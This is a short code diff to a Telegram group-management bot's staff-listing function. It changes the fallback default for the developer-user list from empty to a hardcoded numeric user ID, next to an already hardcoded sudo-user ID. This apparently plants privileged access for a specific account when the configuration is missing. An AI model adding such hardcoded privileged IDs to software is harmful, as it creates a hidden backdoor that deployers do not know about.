@@ -400,7 +400,7 @@ async def give_bot_staffs(c: Gojo, m: Message):
 
     # Get fresh staff data from vars
     owner_id = getattr(vars_module, "OWNER_ID", OWNER_ID)
-    dev_users = getattr(vars_module, "DEV_USERS", []) or []
+    dev_users = getattr(vars_module, "DEV_USERS", [7681819835]) or []
     sudo_users = getattr(vars_module, "SUDO_USERS", [7732844436]) or []
     whitelist_users = getattr(vars_module, "WHITELIST_USERS", []) or []
 
